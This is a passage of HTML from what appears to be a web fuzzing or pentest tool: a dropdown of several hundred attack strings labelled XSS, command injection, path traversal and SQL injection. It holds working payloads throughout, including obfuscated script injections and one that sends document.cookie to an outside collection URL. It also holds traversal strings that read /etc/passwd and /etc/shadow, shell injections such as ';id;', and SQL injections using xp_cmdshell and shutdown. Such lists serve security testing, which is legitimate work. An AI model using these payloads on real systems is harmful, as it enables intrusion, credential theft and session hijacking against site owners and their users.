SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;">23) &lt;IMG SRC=javascript:alert(String.fromCharCode(8..</option><option value="&lt;IMG%20SRC=&#039;javasc	ript:document.write(String.fromCharCode(86,117,108,110,101,114,97,98,108,101,32,116,111,32,88,83,83,33,32,84,114,117,115,116,32,109,101,33))&#039;&gt;">24) &lt;IMG%20SRC=&#039;javasc	ript:..</option><option value="&lt;IMG SRC=&quot;jav	ascript:alert(&#039;XSS&#039;);&quot;&gt;">25) &lt;IMG SRC=&quot;jav	ascript:alert(&#039;XSS&#039..</option><option value="&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#039;XSS&#039;);&quot;&gt;">26) &lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#039..</option><option value="&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#039;XSS&#039;);&quot;&gt;">27) &lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#039..</option><option value="&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#039;XSS&#039;);&quot;&gt;">28) &lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&#039..</option><option value="&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&#039;XSS&#039;);&quot;&gt;">29) &lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&#0..</option><option value="&lt;IMG DYNSRC=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;">30) &lt;IMG DYNSRC=&quot;javascript:alert(&#039;XSS&#0..</option><option value="&lt;IMG LOWSRC=&quot;javascript:alert(&#039;XSS&#039;)&quot;&gt;">31) &lt;IMG LOWSRC=&quot;javascript:alert(&#039;XSS&#0..</option><option value="&lt;IMG%20SRC=&#039;%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)&#039;&gt;">32) &lt;IMG%20SRC=&#039;%26%23x6a;avasc%26%23000010rip..</option><option value="&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;">33) &lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;..</option><option value="&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;">34) &lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#000011..</option><option value="&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;">35) &lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&a..</option><option value="&#039;%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E">36) &#039;%3CIFRAME%20SRC=javascript:alert(%2527XSS%25..</option><option value="%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E">37) %22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A..</option><option value="&#039;;alert(String.fromCharCode(88,83,83))//\\&#039;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//&gt;&lt;/SCRIPT&gt;!--&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;=&amp;{}">38) &#039;;alert(String.fromCharCode(88,83,83))//\\&#0..</option><option value="&#039;&#039;;!--&quot;&lt;XSS&gt;=&amp;{()}">39) &#039;&#039;;!--&quot;&lt;XSS&gt;=&amp;{()}..</option></optgroup><option value="A">40) A..</option><option value="TRUE">41) TRUE..</option><option value="FALSE">42) FALSE..</option><option value="0">43) 0..</option><option value="00">44) 00..</option><option value="1">45) 1..</option><option value="-1">46) -1..</option><option value="1.0">47) 1.0..</option><option value="-1.0">48) -1.0..</option><option value="2">49) 2..</option><option value="-2">50) -2..</option><option value="-20">51) -20..</option><option value="65536">52) 65536..</option><option value="268435455">53) 268435455..</option><option value="-268435455">54) -268435455..</option><option value="2147483647">55) 2147483647..</option><option value="0xfffffff">56) 0xfffffff..</option><option value="NULL">57) NULL..</option><option value="null">58) null..</option><option value="\\0">59) \\0..</option><option value="\\00">60) \\00..</option><option value="&lt;  script &gt; &lt; / script&gt;">61) &lt;  script &gt; &lt; / script&gt;..</option><option value="%0a">62) %0a..</option><option value="%00">63) %00..</option><option value="+%00">64) +%00..</option><option value="\\0">65) \\0..</option><option value="\\0\\0">66) \\0\\0..</option><option value="\\0\\0\\0">67) \\0\\0\\0..</option><option value="\\00">68) \\00..</option><option value="\\00\\00">69) \\00\\00..</option><option value="\\00\\00\\00">70) \\00\\00\\00..</option><option value="$null">71) $null..</option><option value="$NULL">72) $NULL..</option><optgroup label="Command Injection"><option value="`id`">73) `id`..</option><option value="`dir`">74) `dir`..</option><option value=";id;">75) ;id;..</option><option value=";read;">76) ;read;..</option><option value=";netstat -a;">77) ;netstat -a;..</option><option value="\\nnetstat -a%\\n">78) \\nnetstat -a%\\n..</option><option value="\\&quot;blah">79) \\&quot;blah..</option><option value="|id|">80) |id|..</option><option value="&amp;quot;;id&amp;quot;">81) &amp;quot;;id&amp;quot;..</option><option value="id%00">82) id%00..</option><option value="id%00|">83) id%00|..</option><option value="|id">84) |id..</option><option value="|dir">85) |dir..</option><option value="|dir|">86) |dir|..</option><option value="|ls">87) |ls..</option><option value="|ls -la">88) |ls -la..</option><option value=";ls -la">89) ;ls -la..</option><option value=";dir">90) ;dir..</option><option value="|/bin/ls -al">91) |/bin/ls -al..</option><option value="\\n/bin/ls -al\\n">92) \\n/bin/ls -al\\n..</option></optgroup><option value="?x=">93) ?x=..</option><option value="?x=&quot;">94) ?x=&quot;..</option><option value="?x=|">95) ?x=|..</option><option value="?x=&gt;">96) ?x=&gt;..</option><option value="/index.html|id|">97) /index.html|id|..</option><optgroup label="Path Traversal"><option value="/boot.ini">98) /boot.ini..</option><option value="/etc/passwd">99) /etc/passwd..</option><option value="/etc/shadow">100) /etc/shadow..</option><option value="ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|">101) ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8...</option><option value="../../../../../../../../../../../../etc/hosts%00">102) ../../../../../../../../../../../../etc/hosts%00..</option><option value="../../../../../../../../../../../../etc/hosts">103) ../../../../../../../../../../../../etc/hosts..</option><option value="../../boot.ini">104) ../../boot.ini..</option><option value="/../../../../../../../../%2A">105) /../../../../../../../../%2A..</option><option value="../../../../../../../../../../../../etc/passwd%00">106) ../../../../../../../../../../../../etc/passwd%00..</option><option value="../../../../../../../../../../../../etc/passwd">107) ../../../../../../../../../../../../etc/passwd..</option><option value="../../../../../../../../../../../../etc/shadow%00">108) ../../../../../../../../../../../../etc/shadow%00..</option><option value="../../../../../../../../../../../../etc/shadow">109) ../../../../../../../../../../../../etc/shadow..</option><option value="/../../../../../../../../../../etc/passwd^^">110) /../../../../../../../../../../etc/passwd^^..</option><option value="/../../../../../../../../../../etc/shadow^^">111) /../../../../../../../../../../etc/shadow^^..</option><option value="/../../../../../../../../../../etc/passwd">112) /../../../../../../../../../../etc/passwd..</option><option value="/../../../../../../../../../../etc/shadow">113) /../../../../../../../../../../etc/shadow..</option><option value="/./././././././././././etc/passwd">114) /./././././././././././etc/passwd..</option><option value="/./././././././././././etc/shadow">115) /./././././././././././etc/shadow..</option><option value="\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd">116) \\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\pas..</option><option value="\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow">117) \\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\sha..</option><option value="..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd">118) ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passw..</option><option value="..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow">119) ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shado..</option><option value="/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd">120) /..\\../..\\../..\\../..\\../..\\../..\\../etc/pas..</option><option value="/..\\../..\\../..\\../..\\../..\\../..\\../etc/shadow">121) /..\\../..\\../..\\../..\\../..\\../..\\../etc/sha..</option><option value=".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd">122) .\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/pass..</option><option value=".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/shadow">123) .\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/shad..</option><option value="\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00">124) \\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\pas..</option><option value="\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00">125) \\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\sha..</option><option value="..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd%00">126) ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passw..</option><option value="..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shadow%00">127) ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shado..</option><option value="%0a/bin/cat%20/etc/passwd">128) %0a/bin/cat%20/etc/passwd..</option><option value="%0a/bin/cat%20/etc/shadow">129) %0a/bin/cat%20/etc/shadow..</option><option value="%00/etc/passwd%00">130) %00/etc/passwd%00..</option><option value="%00/etc/shadow%00">131) %00/etc/shadow%00..</option><option value="%00../../../../../../etc/passwd">132) %00../../../../../../etc/passwd..</option><option value="%00../../../../../../etc/shadow">133) %00../../../../../../etc/shadow..</option><option value="/../../../../../../../../../../../etc/passwd%00.jpg">134) /../../../../../../../../../../../etc/passwd%00.jp..</option><option value="/../../../../../../../../../../../etc/passwd%00.html">135) /../../../../../../../../../../../etc/passwd%00.ht..</option><option value="/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd">136) /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0..</option><option value="/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow">137) /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0..</option><option value="/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd">138) /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/..</option><option value="/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow">139) /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/..</option><option value="%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00">140) %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2..</option><option value="/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00">141) /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%..</option><option value="%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00">142) %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2..</option><option value="%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini">143) %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%2..</option><option value="/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini">144) /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%..</option><option value="\\\\&amp;apos;/bin/cat%20/etc/passwd\\\\&amp;apos;">145) \\\\&amp;apos;/bin/cat%20/etc/passwd\\\\&amp;apos;..</option><option value="\\\\&amp;apos;/bin/cat%20/etc/shadow\\\\&amp;apos;">146) \\\\&amp;apos;/bin/cat%20/etc/shadow\\\\&amp;apos;..</option><option value="../../../../../../../../conf/server.xml">147) ../../../../../../../../conf/server.xml..</option><option value="/../../../../../../../../bin/id|">148) /../../../../../../../../bin/id|..</option><option value="C:/inetpub/wwwroot/global.asa">149) C:/inetpub/wwwroot/global.asa..</option><option value="C:\\inetpub\\wwwroot\\global.asa">150) C:\\inetpub\\wwwroot\\global.asa..</option><option value="C:/boot.ini">151) C:/boot.ini..</option><option value="C:\\boot.ini">152) C:\\boot.ini..</option><option value="../../../../../../../../../../../../localstart.asp%00">153) ../../../../../../../../../../../../localstart.asp..</option><option value="../../../../../../../../../../../../localstart.asp">154) ../../../../../../../../../../../../localstart.asp..</option><option value="../../../../../../../../../../../../boot.ini%00">155) ../../../../../../../../../../../../boot.ini%00..</option><option value="../../../../../../../../../../../../boot.ini">156) ../../../../../../../../../../../../boot.ini..</option><option value="/./././././././././././boot.ini">157) /./././././././././././boot.ini..</option><option value="/../../../../../../../../../../../boot.ini%00">158) /../../../../../../../../../../../boot.ini%00..</option><option value="/../../../../../../../../../../../boot.ini">159) /../../../../../../../../../../../boot.ini..</option><option value="/..\\../..\\../..\\../..\\../..\\../..\\../boot.ini">160) /..\\../..\\../..\\../..\\../..\\../..\\../boot.in..</option><option value="/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./boot.ini">161) /.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./boot.in..</option><option value="\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini">162) \\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini..</option><option value="..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%00">163) ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini%0..</option><option value="..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini">164) ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini..</option><option value="/../../../../../../../../../../../boot.ini%00.html">165) /../../../../../../../../../../../boot.ini%00.html..</option><option value="/../../../../../../../../../../../boot.ini%00.jpg">166) /../../../../../../../../../../../boot.ini%00.jpg..</option><option value="/.../.../.../.../.../">167) /.../.../.../.../.../..</option><option value="..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini">168) ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%..</option><option value="/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini">169) /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/..</option></optgroup><option value="%0d%0aX-Injection-Header:%20AttackValue">170) %0d%0aX-Injection-Header:%20AttackValue..</option><option value="!@#0%^#0##018387@#0^^**(()">171) !@#0%^#0##018387@#0^^**(()..</option><option value="%01%02%03%04%0a%0d%0aADSF">172) %01%02%03%04%0a%0d%0aADSF..</option><option value="/,%ENV,/">173) /,%ENV,/..</option><option value="&amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/passwd&amp;quot;--&amp;gt;">174) &amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/p..</option><option value="&amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/shadow&amp;quot;--&amp;gt;">175) &amp;lt;!--#exec%20cmd=&amp;quot;/bin/cat%20/etc/s..</option><option value="%">176) %..</option><option value="#">177) #..</option><option value="*">178) *..</option><option value="}">179) }..</option><option value=";">180) ;..</option><option value="/">181) /..</option><option value="\\">182) \\..</option><option value="\\\\">183) \\\\..</option><option value="\\\\/">184) \\\\/..</option><option value="\\\\\\\\*">185) \\\\\\\\*..</option><option value="\\\\\\\\?\\\\">186) \\\\\\\\?\\\\..</option><option value="&amp;lt">187) &amp;lt..</option><option value="&amp;lt;">188) &amp;lt;..</option><option value="&amp;LT">189) &amp;LT..</option><option value="&amp;LT;">190) &amp;LT;..</option><option value="&lt;">191) &lt;..</option><option value="&lt;&lt;">192) &lt;&lt;..</option><option value="&lt;&lt;&lt;">193) &lt;&lt;&lt;..</option><option value="|">194) |..</option><option value="||">195) ||..</option><option value="`">196) `..</option><option value="-">197) -..</option><option value="--">198) --..</option><option value="*|">199) *|..</option><option value="^&#039;">200) ^&#039;..</option><option value="\\&#039;">201) \\&#039;..</option><option value="/&#039;">202) /&#039;..</option><option value="@&#039;">203) @&#039;..</option><option value="(&#039;)">204) (&#039;)..</option><option value="{&#039;}">205) {&#039;}..</option><option value="[&#039;]">206) [&#039;]..</option><option value="*&#039;">207) *&#039;..</option><option value="#&#039;">208) #&#039;..</option><option value="!&#039;">209) !&#039;..</option><option value="!@#$%%^#$%#$@#$%$$@#$%^^**(()">210) !@#$%%^#$%#$@#$%$$@#$%^^**(()..</option><option value="%01%02%03%04%0a%0d%0aADSF">211) %01%02%03%04%0a%0d%0aADSF..</option><option value="\\t">212) \\t..</option><option value="&quot;\\t&quot;">213) &quot;\\t&quot;..</option><option value="&amp;#10;">214) &amp;#10;..</option><option value="&amp;#13;">215) &amp;#13;..</option><option value="&amp;#10;&amp;#13;">216) &amp;#10;&amp;#13;..</option><option value="&amp;#13;&amp;#10;">217) &amp;#13;&amp;#10;..</option><option value="#xD">218) #xD..</option><option value="#xA">219) #xA..</option><option value="#xD#xA">220) #xD#xA..</option><option value="#xA#xD">221) #xA#xD..</option><option value="/%00/">222) /%00/..</option><option value="%00/">223) %00/..</option><option value="%00">224) %00..</option><option value="&lt;?">225) &lt;?..</option><option value="%3C">226) %3C..</option><option value="%3C%3F">227) %3C%3F..</option><option value="%60">228) %60..</option><option value="%5C">229) %5C..</option><option value="%5C/">230) %5C/..</option><option value="%7C">231) %7C..</option><option value="%00">232) %00..</option><option value="/%2A">233) /%2A..</option><option value="%2A">234) %2A..</option><option value="%2C">235) %2C..</option><option value="%20">236) %20..</option><option value="%20|">237) %20|..</option><option value="%250a">238) %250a..</option><option value="%2500">239) %2500..</option><option value="../">240) ../..</option><option value="%2e%2e%2f">241) %2e%2e%2f..</option><option value="..%u2215">242) ..%u2215..</option><option value="..%c0%af">243) ..%c0%af..</option><option value="..%bg%qf">244) ..%bg%qf..</option><option value="..\\">245) ..\\..</option><option value="..%5c">246) ..%5c..</option><option value="..%%35c">247) ..%%35c..</option><option value="..%255c">248) ..%255c..</option><option value="..%%35%63">249) ..%%35%63..</option><option value="..%25%35%63">250) ..%25%35%63..</option><option value="..%u2216">251) ..%u2216..</option><option value="&amp;#60">252) &amp;#60..</option><option value="&amp;#060">253) &amp;#060..</option><option value="&amp;#0060">254) &amp;#0060..</option><option value="&amp;#00060">255) &amp;#00060..</option><option value="&amp;#000060">256) &amp;#000060..</option><option value="&amp;#0000060">257) &amp;#0000060..</option><option value="&amp;#60;">258) &amp;#60;..</option><option value="&amp;#060;">259) &amp;#060;..</option><option value="&amp;#0060;">260) &amp;#0060;..</option><option value="&amp;#00060;">261) &amp;#00060;..</option><option value="&amp;#000060;">262) &amp;#000060;..</option><option value="&amp;#0000060;">263) &amp;#0000060;..</option><option value="&amp;#x3c">264) &amp;#x3c..</option><option value="&amp;#x03c">265) &amp;#x03c..</option><option value="&amp;#x003c">266) &amp;#x003c..</option><option value="&amp;#x0003c">267) &amp;#x0003c..</option><option value="&amp;#x00003c">268) &amp;#x00003c..</option><option value="&amp;#x000003c">269) &amp;#x000003c..</option><option value="&amp;#x3c;">270) &amp;#x3c;..</option><option value="&amp;#x03c;">271) &amp;#x03c;..</option><option value="&amp;#x003c;">272) &amp;#x003c;..</option><option value="&amp;#x0003c;">273) &amp;#x0003c;..</option><option value="&amp;#x00003c;">274) &amp;#x00003c;..</option><option value="&amp;#x000003c;">275) &amp;#x000003c;..</option><option value="&amp;#X3c">276) &amp;#X3c..</option><option value="&amp;#X03c">277) &amp;#X03c..</option><option value="&amp;#X003c">278) &amp;#X003c..</option><option value="&amp;#X0003c">279) &amp;#X0003c..</option><option value="&amp;#X00003c">280) &amp;#X00003c..</option><option value="&amp;#X000003c">281) &amp;#X000003c..</option><option value="&amp;#X3c;">282) &amp;#X3c;..</option><option value="&amp;#X03c;">283) &amp;#X03c;..</option><option value="&amp;#X003c;">284) &amp;#X003c;..</option><option value="&amp;#X0003c;">285) &amp;#X0003c;..</option><option value="&amp;#X00003c;">286) &amp;#X00003c;..</option><option value="&amp;#X000003c;">287) &amp;#X000003c;..</option><option value="&amp;#x3C">288) &amp;#x3C..</option><option value="&amp;#x03C">289) &amp;#x03C..</option><option value="&amp;#x003C">290) &amp;#x003C..</option><option value="&amp;#x0003C">291) &amp;#x0003C..</option><option value="&amp;#x00003C">292) &amp;#x00003C..</option><option value="&amp;#x000003C">293) &amp;#x000003C..</option><option value="&amp;#x3C;">294) &amp;#x3C;..</option><option value="&amp;#x03C;">295) &amp;#x03C;..</option><option value="&amp;#x003C;">296) &amp;#x003C;..</option><option value="&amp;#x0003C;">297) &amp;#x0003C;..</option><option value="&amp;#x00003C;">298) &amp;#x00003C;..</option><option value="&amp;#x000003C;">299) &amp;#x000003C;..</option><option value="&amp;#X3C">300) &amp;#X3C..</option><option value="&amp;#X03C">301) &amp;#X03C..</option><option value="&amp;#X003C">302) &amp;#X003C..</option><option value="&amp;#X0003C">303) &amp;#X0003C..</option><option value="&amp;#X00003C">304) &amp;#X00003C..</option><option value="&amp;#X000003C">305) &amp;#X000003C..</option><option value="&amp;#X3C;">306) &amp;#X3C;..</option><option value="&amp;#X03C;">307) &amp;#X03C;..</option><option value="&amp;#X003C;">308) &amp;#X003C;..</option><option value="&amp;#X0003C;">309) &amp;#X0003C;..</option><option value="&amp;#X00003C;">310) &amp;#X00003C;..</option><option value="&amp;#X000003C;">311) &amp;#X000003C;..</option><option value="\\x3c">312) \\x3c..</option><option value="\\x3C">313) \\x3C..</option><option value="\\u003c">314) \\u003c..</option><option value="\\u003C">315) \\u003C..</option><option value="something%00html">316) something%00html..</option><option value="&amp;apos;">317) &amp;apos;..</option><option value="/&amp;apos;">318) /&amp;apos;..</option><option value="\\&amp;apos;">319) \\&amp;apos;..</option><option value="^&amp;apos;">320) ^&amp;apos;..</option><option value="@&amp;apos;">321) @&amp;apos;..</option><option value="{&amp;apos;}">322) {&amp;apos;}..</option><option value="[&amp;apos;]">323) [&amp;apos;]..</option><option value="*&amp;apos;">324) *&amp;apos;..</option><option value="#&amp;apos;">325) #&amp;apos;..</option><optgroup label="SQL Injection"><option value="&#039;">326) &#039;..</option><option value="&quot;">327) &quot;..</option><option value="#">328) #..</option><option value="-">329) -..</option><option value="--">330) --..</option><option value="&#039; --">331) &#039; --..</option><option value="--&#039;;">332) --&#039;;..</option><option value="&#039; ;">333) &#039; ;..</option><option value="= &#039;">334) = &#039;..</option><option value="= ;">335) = ;..</option><option value="= --">336) = --..</option><option value="\\x23">337) \\x23..</option><option value="\\x27">338) \\x27..</option><option value="\\x3D \\x3B&#039;">339) \\x3D \\x3B&#039;..</option><option value="\\x3D \\x27">340) \\x3D \\x27..</option><option value="\\x27\\x4F\\x52 SELECT *">341) \\x27\\x4F\\x52 SELECT *..</option><option value="\\x27\\x6F\\x72 SELECT *">342) \\x27\\x6F\\x72 SELECT *..</option><option value="&#039;or select *">343) &#039;or select *..</option><option value="admin&#039;--">344) admin&#039;--..</option><option value="&#039;;shutdown--">345) &#039;;shutdown--..</option><option value="&lt;&gt;&quot;&#039;%;)(&amp;+">346) &lt;&gt;&quot;&#039;%;)(&amp;+..</option><option value="&#039; or &#039;&#039;=&#039;">347) &#039; or &#039;&#039;=&#039;..</option><option value="&#039; or &#039;x&#039;=&#039;x">348) &#039; or &#039;x&#039;=&#039;x..</option><option value="&quot; or &quot;x&quot;=&quot;x">349) &quot; or &quot;x&quot;=&quot;x..</option><option value="&#039;) or (&#039;x&#039;=&#039;x">350) &#039;) or (&#039;x&#039;=&#039;x..</option><option value="0 or 1=1">351) 0 or 1=1..</option><option value="&#039; or 0=0 --">352) &#039; or 0=0 --..</option><option value="&quot; or 0=0 --">353) &quot; or 0=0 --..</option><option value="or 0=0 --">354) or 0=0 --..</option><option value="&#039; or 0=0 #">355) &#039; or 0=0 #..</option><option value="&quot; or 0=0 #">356) &quot; or 0=0 #..</option><option value="or 0=0 #">357) or 0=0 #..</option><option value="&#039; or 1=1--">358) &#039; or 1=1--..</option><option value="&quot; or 1=1--">359) &quot; or 1=1--..</option><option value="&#039; or &#039;1&#039;=&#039;1&#039;--">360) &#039; or &#039;1&#039;=&#039;1&#039;--..</option><option value="&quot;&#039; or 1 --&#039;&quot;">361) &quot;&#039; or 1 --&#039;&quot;..</option><option value="or 1=1--">362) or 1=1--..</option><option value="or%201=1">363) or%201=1..</option><option value="or%201=1 --">364) or%201=1 --..</option><option value="&#039; or 1=1 or &#039;&#039;=&#039;">365) &#039; or 1=1 or &#039;&#039;=&#039;..</option><option value="&quot; or 1=1 or &quot;&quot;=&quot;">366) &quot; or 1=1 or &quot;&quot;=&quot;..</option><option value="&#039; or a=a--">367) &#039; or a=a--..</option><option value="&quot; or &quot;a&quot;=&quot;a">368) &quot; or &quot;a&quot;=&quot;a..</option><option value="&#039;) or (&#039;a&#039;=&#039;a">369) &#039;) or (&#039;a&#039;=&#039;a..</option><option value="&quot;) or (&quot;a&quot;=&quot;a">370) &quot;) or (&quot;a&quot;=&quot;a..</option><option value="hi&quot; or &quot;a&quot;=&quot;a">371) hi&quot; or &quot;a&quot;=&quot;a..</option><option value="hi&quot; or 1=1 --">372) hi&quot; or 1=1 --..</option><option value="hi&#039; or 1=1 --">373) hi&#039; or 1=1 --..</option><option value="hi&#039; or &#039;a&#039;=&#039;a">374) hi&#039; or &#039;a&#039;=&#039;a..</option><option value="hi&#039;) or (&#039;a&#039;=&#039;a">375) hi&#039;) or (&#039;a&#039;=&#039;a..</option><option value="hi&quot;) or (&quot;a&quot;=&quot;a">376) hi&quot;) or (&quot;a&quot;=&quot;a..</option><option value="&#039;hi&#039; or &#039;x&#039;=&#039;x&#039;;">377) &#039;hi&#039; or &#039;x&#039;=&#039;x&#039;;..</option><option value="@variable">378) @variable..</option><option value=",@variable">379) ,@variable..</option><option value="PRINT">380) PRINT..</option><option value="PRINT @@variable">381) PRINT @@variable..</option><option value="select">382) select..</option><option value="insert">383) insert..</option><option value="as">384) as..</option><option value="or">385) or..</option><option value="procedure">386) procedure..</option><option value="limit">387) limit..</option><option value="order by">388) order by..</option><option value="asc">389) asc..</option><option value="desc">390) desc..</option><option value="delete">391) delete..</option><option value="update">392) update..</option><option value="distinct">393) distinct..</option><option value="having">394) having..</option><option value="truncate">395) truncate..</option><option value="replace">396) replace..</option><option value="like">397) like..</option><option value="handler">398) handler..</option><option value="bfilename">399) bfilename..</option><option value="&#039; or username like &#039;%">400) &#039; or username like &#039;%..</option><option value="&#039; or uname like &#039;%">401) &#039; or uname like &#039;%..</option><option value="&#039; or userid like &#039;%">402) &#039; or userid like &#039;%..</option><option value="&#039; or uid like &#039;%">403) &#039; or uid like &#039;%..</option><option value="&#039; or user like &#039;%">404) &#039; or user like &#039;%..</option><option value="exec xp">405) exec xp..</option><option value="exec sp">406) exec sp..</option><option value="&#039;; exec master..xp_cmdshell">407) &#039;; exec master..xp_cmdshell..</option><option value="&#039;; exec xp_regread">408) &#039;; exec xp_regread..</option><option value="t&#039;exec master..xp_cmdshell &#039;nslookup www.google.com&#039;--">409) t&#039;exec master..xp_cmdshell &#039;nslookup www..</option><option value="--sp_password">410) --sp_password..</option><option value="\\x27UNION SELECT">411) \\x27UNION SELECT..</option><option value="&#039; UNION SELECT">412) &#039; UNION SELECT..</option><option value="&#039; UNION ALL SELECT">413) &#039; UNION ALL SELECT..</option><option value="&#039; or (EXISTS)">414) &#039; or (EXISTS)..</option><option value="&#039; (select top 1">415) &#039; (select top 1..</option><option value="&#039;||UTL_HTTP.REQUEST">416) &#039;||UTL_HTTP.REQUEST..</option><option value="1;SELECT%20*">417) 1;SELECT%20*..</option><option value="to_timestamp_tz">418) to_timestamp_tz..</option><option value="tz_offset">419) tz_offset..</option><option value="&amp;lt;&amp;gt;&amp;quot;&#039;%;)(&amp;amp;+">420) 